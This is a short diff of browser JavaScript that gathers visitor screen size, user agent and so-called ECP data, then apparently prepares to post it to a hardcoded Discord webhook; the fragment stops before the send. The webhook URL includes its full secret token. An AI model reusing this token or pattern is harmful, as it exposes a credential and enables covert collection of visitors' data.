@@ -200,15 +200,17 @@
     }
     console.log("ECP Status:", ecpStatus);
     console.log("Formatted ECP Data:", formattedECPData);
-    const userAgent = navigator.userAgent;
+  
+    // Define deviceInfo before using it
     const deviceInfo = {
       screen: {
         width: window.screen.width,
         height: window.screen.height
       },
-      browser: userAgent,
+      browser: navigator.userAgent,
       timestamp: new Date().toISOString()
     };
+  
     const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
     const payload = {
       embeds: [{
